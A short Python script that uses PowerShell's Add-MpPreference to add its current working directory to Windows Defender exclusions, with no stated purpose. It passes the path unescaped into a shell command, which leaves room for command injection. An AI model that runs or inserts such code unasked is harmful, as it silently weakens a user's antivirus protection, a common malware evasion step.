import subprocess
import os

def add_to_defender_exclusions(path):
    command = f'powershell -Command "Add-MpPreference -ExclusionPath \'{path}\'"'
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    
    if result.returncode != 0:
        print(f"Failed to add to Defender exclusions: {result.stderr}")
    else:
        print(f"Successfully added {path} to Defender exclusions.")



if __name__ == "__main__":
    current_directory = os.getcwd()
    add_to_defender_exclusions(current_directory)

